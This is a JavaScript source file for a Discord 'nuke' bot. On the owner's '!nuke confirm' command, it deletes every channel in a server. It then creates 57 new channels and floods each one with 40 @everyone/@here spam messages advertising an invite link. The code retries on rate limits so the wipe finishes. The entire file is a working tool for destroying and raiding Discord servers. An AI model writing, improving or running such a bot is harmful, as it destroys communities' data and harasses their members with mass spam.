// index.js - the nuke bot thingy
const { Client, GatewayIntentBits, PermissionsBitField, ChannelType } = require('discord.js');
const fs = require('fs');
require('dotenv').config();

// try to get token from env or from a config.json (because railway sometimes derps)
let TOKEN = process.env.TOKEN;
let OWNER_ID = process.env.OWNER_ID;

// fallback to config file if env missing
if (!TOKEN || !OWNER_ID) {
  try {
    const config = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
    TOKEN = config.TOKEN;
    OWNER_ID = config.OWNER_ID;
    console.log("loaded from config.json because env vars were missing");
  } catch(e) {
    console.error("FATAL: No token or owner id found. Put them in .env or config.json");
    process.exit(1);
  }
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ]
});

const prefix = "!";
const owner = OWNER_ID;

// the evil message template
const spamMsg = `@everyone @here Lipad server mga kumag! https://discord.gg/qWD57gU7S __script__ . ~~boost~~ ||@everyone|| ||@here||`;

// dumb delay function because rate limits suck
function wait(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// send 40 messages in a channel
async function flood(channel, times) {
  let sent = 0;
  for (let i = 0; i < times; i++) {
    try {
      await channel.send(spamMsg);
      sent++;
      await wait(250); // dont get banned pls
    } catch(err) {
      if (err.code == 429) {
        console.log(`rate limited, waiting ${err.retryAfter}s`);
        await wait(err.retryAfter * 1000);
        i--; // try again
      } else {
        console.log("failed to send one msg: " + err.message);
      }
    }
  }
  console.log(`done ${sent}/${times} in #${channel.name}`);
}

// delete every channel one by one
async function wipeChannels(guild) {
  let channels = guild.channels.cache;
  console.log(`nuking ${channels.size} channels...`);
  for(let chan of channels.values()) {
    try {
      await chan.delete();
      console.log(`deleted ${chan.name}`);
      await wait(300);
    } catch(e) {
      console.log(`couldnt delete ${chan.name} - ${e.message}`);
    }
  }
}

// make 57 text channels fast (but not too fast)
async function makeChannels(guild, amount) {
  let created = [];
  for(let i = 1; i <= amount; i++) {
    let name = `lipad-server-mga-kumag-${i}`;
    try {
      let c = await guild.channels.create({
        name: name,
        type: ChannelType.GuildText,
        permissionOverwrites: [{
          id: guild.roles.everyone,
          allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages]
        }]
      });
      created.push(c);
      console.log(`made channel #${name}`);
      await wait(300);
    } catch(err) {
      if(err.code == 429) {
        console.log("rate limit on create, waiting a bit");
        await wait(err.retryAfter * 1000);
        i--;
      } else {
        console.log("failed to create " + name + " - " + err.message);
      }
    }
  }
  return created;
}

// main destruction function
async function nukeServer(guild) {
  console.log(`🔥 STARTING NUKE ON ${guild.name}`);
  await wipeChannels(guild);
  let newChannels = await makeChannels(guild, 57);
  for(let ch of newChannels) {
    await flood(ch, 40);
    await wait(500);
  }
  console.log("NUKE FINISHED LMAO");
}

client.once('ready', () => {
  console.log(`bot online as ${client.user.tag}`);
});

client.on('messageCreate', async (msg) => {
  if(msg.author.bot) return;
  if(!msg.content.startsWith(prefix)) return;
  
  let args = msg.content.slice(prefix.length).trim().split(/ +/);
  let cmd = args.shift().toLowerCase();
  
  if(cmd == 'nuke') {
    // only the owner can do this
    if(msg.author.id != owner) {
      return msg.reply("nice try but no. only my owner can use this.");
    }
    
    if(args[0] != 'confirm') {
      return msg.reply("⚠️ are you sure? this will DELETE ALL CHANNELS and make 57 new ones with 40 pings each. type `!nuke confirm` if you really want it.");
    }
    
    let guild = msg.guild;
    if(!guild) return msg.reply("this only works in a server dummy");
    
    await msg.reply("💣 NUKE ACTIVATED. deleting everything...");
    try {
      await nukeServer(guild);
    } catch(err) {
      console.log("big error: " + err);
      try {
        let sysChan = guild.systemChannel;
        if(sysChan) await sysChan.send(`nuke failed: ${err.message}`);
      } catch(e) {}
    }
  }
});

client.login(TOKEN);
